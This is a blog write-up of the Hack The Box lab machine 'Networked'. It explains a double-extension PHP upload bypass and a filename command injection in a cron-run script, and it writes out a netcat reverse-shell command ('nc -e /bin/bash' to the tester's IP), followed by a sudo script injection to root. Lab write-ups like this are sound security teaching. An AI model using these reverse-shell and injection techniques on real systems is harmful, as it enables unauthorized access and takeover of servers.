---
layout: single
title: Networked - Hack The Box
excerpt: "Networked was an easy box that starts off with a classic insecure upload vulnerability in an image gallery web application. The Apache server is misconfigured and let me use a double extension to get remote code execution through my PHP script. To escalate to root, we have to find a command injection vulnerability in the script that checks for web application attacks, then exploit another script running as root that changes the ifcfg file."
date: 2019-11-16
classes: wide
header:
  teaser: /assets/images/htb-writeup-networked/networked_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - php
  - upload
  - double extension
  - cronjob
  - command injection
  - sudo
---

![](/assets/images/htb-writeup-networked/networked_logo.png)

Networked was an easy box that starts off with a classic insecure upload vulnerability in an image gallery web application. The Apache server is misconfigured and let me use a double extension to get remote code execution through my PHP script. To escalate to root, we have to find a command injection vulnerability in the script that checks for web application attacks, then exploit another script running as root that changes the ifcfg file.

## Summary

- We can upload a PHP file with a double extension in the image gallery web application and get RCE
- To escalate to user user `guly` I use a command injection vulnerability in the `check_attack.php` script
- There's another command injection vulnerability  in the `changename.sh` script that get me a root shell

```
root@kali:~# nmap -sC -sV -p- 10.10.10.146
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-25 13:51 EDT
Nmap scan report for 10.10.10.146
Host is up (0.17s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https
```

### Website enumeration

The website index page doesn't have anything interesting.

![](/assets/images/htb-writeup-networked/Screenshot_1.png)

In the HTML code there's a comment about some pages not being linked.

![](/assets/images/htb-writeup-networked/Screenshot_2.png)

I'm gonna use gobuster next and scan for files and directories.

![](/assets/images/htb-writeup-networked/Screenshot_3.png)

There's a couple of files in there that looks promising. Luckily for me, there's a `backup.tar` file in the `/backup` directory that contains the sources files:

```
root@kali:~/htb/networked# tar xvf backup.tar
index.php
lib.php
photos.php
upload.php
```

The `/photos.php` contains an image gallery:

![](/assets/images/htb-writeup-networked/Screenshot_5.png)

The `/upload.php` page is used to upload new images to the gallery:

![](/assets/images/htb-writeup-networked/Screenshot_6.png)

When I upload an image, I get the following message then the picture is added in the gallery. Note that the image file name is renamed to the IP addres of my own machine, with dots replaced by underscores.

![](/assets/images/htb-writeup-networked/Screenshot_8.png)

![](/assets/images/htb-writeup-networked/Screenshot_9.png)

When I try to upload a PHP script, I get an error message so there is some kind of validation performed on uploaded files:

![](/assets/images/htb-writeup-networked/Screenshot_7.png)

### Hunting for vulnerabilities in the source code

Looking at the `upload.php` file, I pick up a few checks that the code makes against my uploaded file:

1. The filesize must less than 60,000 bytes
![](/assets/images/htb-writeup-networked/code1.png)

2. The extension of the uploaded file must be one of the following: `.jpg, .png, .gif, .jpeg`
![](/assets/images/htb-writeup-networked/code2.png)

3. The MIME type of the uploaded file must start with `image/` (the code below in from `lib.php`)
![](/assets/images/htb-writeup-networked/code3.png)

Note that the `file_mime_type` function uses `finfo_open` to return the MIME type so it'll look at the content of the file to determine it's MIME type. I can't just override the MIME type with `Content-Type: image/png` in Burp.

I'll use my previous valid image file upload and add PHP code at the bottom of the payload and change the extension to `.php.png` to pass the checks:

![](/assets/images/htb-writeup-networked/code5.png)

File upload is successful and I see the uploaded file in the gallery (filename has been changed to the IP address but the double extension has been kept):

![](/assets/images/htb-writeup-networked/code6.png)

Browsing to `http://10.10.10.146/uploads/10_10_14_11.php.png` I see that my PHP code embedded in the image file has been executed.

![](/assets/images/htb-writeup-networked/code7.png)

Later once I got root I found out why the webserver executes the image file as PHP even though the extension is `.png`. The Apache configuration uses the `AddHandler php5-script .php` statement instead of `SetHandler` so it will activate the handler if the `.php` suffix is present anywhere in the filename. The following blog explains this in more details: [https://blog.remirepo.net/post/2013/01/13/PHP-and-Apache-SetHandler-vs-AddHandler](https://blog.remirepo.net/post/2013/01/13/PHP-and-Apache-SetHandler-vs-AddHandler)

## Getting a shell as user apache

Now that I have RCE, I can call netcat and get a reverse shell that way.

![](/assets/images/htb-writeup-networked/shell1.png)

![](/assets/images/htb-writeup-networked/shell2.png)

Unfortunately my current `apache` user doesn't have access to read `user.txt` so I likely need to escalate to user `guly` next.

```
bash-4.2$ cd /home/guly
bash-4.2$ ls -la
total 28
drwxr-xr-x. 2 guly guly 159 Jul  9 13:40 .
drwxr-xr-x. 3 root root  18 Jul  2 13:27 ..
lrwxrwxrwx. 1 root root   9 Jul  2 13:35 .bash_history -> /dev/null
-rw-r--r--. 1 guly guly  18 Oct 30  2018 .bash_logout
-rw-r--r--. 1 guly guly 193 Oct 30  2018 .bash_profile
-rw-r--r--. 1 guly guly 231 Oct 30  2018 .bashrc
-rw-------  1 guly guly 639 Jul  9 13:40 .viminfo
-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
-r--------. 1 guly guly  33 Oct 30  2018 user.txt
```

There's a crontab file `crontab.guly` that contains the following:

```
*/3 * * * * php /home/guly/check_attack.php
```

The crontab executes `check_attack.php` which I also have read access to:

```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
	$msg='';
  if ($value == 'index.html') {
	continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}
```

The above code looks for files in `/var/www/html/uploads/` then runs the `getnameCheck` function from `lib.php` against the filename. When the filename fails the check, a logfile `/tmp/attack.log` is created and `$msg` is written to the file. `$msg` is set to null in the code so nothing will ever get written to that log file. The code then deletes any file that is invalid using `exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");`. This is where the command injection vulnerability lies.

The script uses the `exec()` function to pass the `/bin/rm` command instead of using of the native PHP function to delete files. The `$path` variable is set in the code and I can't control it but I can control the `$value` variable since it's the same of the invalid file in `/var/www/html/uploads/`. My goal here is to inject a command like the following: `nohup /bin/rm -f /var/www/html/uploads/; nc -e /bin/bash 10.10.14.11 5555 > /dev/null 2>&1 &`.

I would need to create a filename like `; nc -e /bin/bash 10.10.14.11 5555` but forward slashes are not valid in a filename so I will use `$(which bash)` instead to return the full path to bash.

![](/assets/images/htb-writeup-networked/escalate1.png)

A few moments later I get a shell as `guly` and I get the first flag:

![](/assets/images/htb-writeup-networked/escalate2.png)

## Privesc

The path to root is pretty obvious since there's a sudo entry for `changename.sh`

```console
[guly@networked ~]$ sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
[guly@networked ~]$
```

The shell script requests a few variable from stdin, adds those to `/etc/sysconfig/network-scripts/ifcfg-guly` and then `ifup` is invoked to bring up the interface. There's a regex filter in place to filter special characters.

```sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done

/sbin/ifup guly0
```

After playing with the input for a few minutes I found that I can get RCE as root by adding commands after a space:

![](/assets/images/htb-writeup-networked/privesc1.png)

I can't invoke netcat directly because the hypen character is filtered out. However I can put the command I want to execute in a script that I will call through the sudo command.

![](/assets/images/htb-writeup-networked/privesc2.png)

And... I get a shell as root:

![](/assets/images/htb-writeup-networked/privesc3.png)
